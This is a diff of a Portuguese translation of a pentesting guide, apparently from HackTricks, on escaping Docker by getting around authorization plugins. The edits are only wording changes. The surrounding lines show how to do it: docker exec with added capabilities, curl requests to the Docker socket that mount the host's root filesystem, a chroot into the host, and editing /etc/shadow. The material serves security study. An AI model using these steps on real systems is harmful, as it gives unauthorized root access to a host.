@@ -4,17 +4,17 @@ O modelo de **autorização** do **Docker** é **tudo ou nada**. Qualquer usuár
 
 # Arquitetura básica
 
-Os plugins de autenticação do Docker são **plugins externos** que você pode usar para **permitir/negar** **ações** solicitadas ao daemon do Docker **dependendo** do **usuário** que a solicitou e da **ação** **solicitada**.
+Os plugins de autenticação do Docker são **plugins externos** que você pode usar para **permitir/negar** **ações** solicitadas ao Daemon do Docker **dependendo** do **usuário** que a solicitou e da **ação** **solicitada**.
 
 **[As informações a seguir são da documentação](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Quando uma **solicitação HTTP** é feita ao **daemon** do Docker através da CLI ou via API do Engine, o **subsystem** de **autenticação** **passa** a solicitação para o(s) **plugin(s)** de **autenticação** instalados. A solicitação contém o usuário (chamador) e o contexto do comando. O **plugin** é responsável por decidir se deve **permitir** ou **negar** a solicitação.
+Quando uma **solicitação HTTP** é feita ao **daemon** do Docker através da CLI ou via API do Engine, o **subsystema de autenticação** **passa** a solicitação para o(s) **plugin(s)** de **autenticação** instalados. A solicitação contém o usuário (chamador) e o contexto do comando. O **plugin** é responsável por decidir se deve **permitir** ou **negar** a solicitação.
 
 Os diagramas de sequência abaixo mostram um fluxo de autorização de permitir e negar:
 
-![Fluxo de autorização permitir](https://docs.docker.com/engine/extend/images/authz_allow.png)
+![Fluxo de autorização de permitir](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
-![Fluxo de autorização negar](https://docs.docker.com/engine/extend/images/authz_deny.png)
+![Fluxo de autorização de negar](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
 Cada solicitação enviada ao plugin **inclui o usuário autenticado, os cabeçalhos HTTP e o corpo da solicitação/resposta**. Apenas o **nome do usuário** e o **método de autenticação** utilizado são passados para o plugin. O mais importante, **nenhuma** credencial de **usuário** ou tokens são passados. Finalmente, **nem todos os corpos de solicitação/resposta são enviados** ao plugin de autorização. Apenas aqueles corpos de solicitação/resposta onde o `Content-Type` é `text/*` ou `application/json` são enviados.
 
@@ -76,7 +76,7 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Agora, o usuário pode escapar do contêiner usando qualquer uma das [**técnicas discutidas anteriormente**](./#privileged-flag) e **escalar privilégios** dentro do host.
+Agora, o usuário pode escapar do contêiner usando qualquer uma das [**técnicas discutidas anteriormente**](#privileged-flag) e **escalar privilégios** dentro do host.
 
 ## Montar Pasta Gravável
 
@@ -96,15 +96,15 @@ host> /tmp/bash
 >
 > Note também que se você puder **montar `/etc`** ou qualquer outra pasta **contendo arquivos de configuração**, você pode alterá-los a partir do contêiner docker como root para **abusar deles no host** e escalar privilégios (talvez modificando `/etc/shadow`)
 
-## Endpoint de API Não Verificado
+## Unchecked API Endpoint
 
-A responsabilidade do sysadmin que configura este plugin seria controlar quais ações e com quais privilégios cada usuário pode realizar. Portanto, se o administrador adotar uma abordagem de **lista negra** com os endpoints e os atributos, ele pode **esquecer alguns deles** que poderiam permitir a um atacante **escalar privilégios.**
+A responsabilidade do sysadmin que configura este plugin seria controlar quais ações e com quais privilégios cada usuário pode realizar. Portanto, se o admin adotar uma abordagem de **lista negra** com os endpoints e os atributos, ele pode **esquecer alguns deles** que poderiam permitir a um atacante **escalar privilégios.**
 
 Você pode verificar a API do docker em [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Estrutura JSON Não Verificada
+## Unchecked JSON Structure
 
-### Binds na raiz
+### Binds in root
 
 É possível que quando o sysadmin configurou o firewall do docker, ele **esqueceu de algum parâmetro importante** da [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
 No exemplo a seguir, é possível abusar dessa má configuração para criar e executar um contêiner que monta a pasta raiz (/) do host:
@@ -122,19 +122,19 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 
 ### Binds em HostConfig
 
-Siga a mesma instrução que com **Binds em root** realizando esta **request** para a API Docker:
+Siga a mesma instrução que com **Binds em root** realizando esta **request** para a API do Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Montagens na raiz
+### Montagens em root
 
-Siga as mesmas instruções que com **Vínculos na raiz** realizando esta **solicitação** para a API do Docker:
+Siga as mesmas instruções que com **Vinculações em root** realizando esta **solicitação** à API do Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### Montagens em HostConfig
+### Mounts in HostConfig
 
-Siga as mesmas instruções que em **Binds em root** realizando esta **solicitação** para a API do Docker:
+Siga as mesmas instruções que em **Binds in root** realizando esta **request** para a API do Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
@@ -151,7 +151,7 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 > [!NOTE]
-> O **`HostConfig`** é a chave que geralmente contém os **privilegios** **interessantes** para escapar do contêiner. No entanto, como discutimos anteriormente, observe como usar Binds fora dele também funciona e pode permitir que você contorne restrições.
+> O **`HostConfig`** é a chave que geralmente contém os **privileges** **interessantes** para escapar do contêiner. No entanto, como discutimos anteriormente, observe como usar Binds fora dele também funciona e pode permitir que você contorne restrições.
 
 ## Desabilitando o Plugin
 
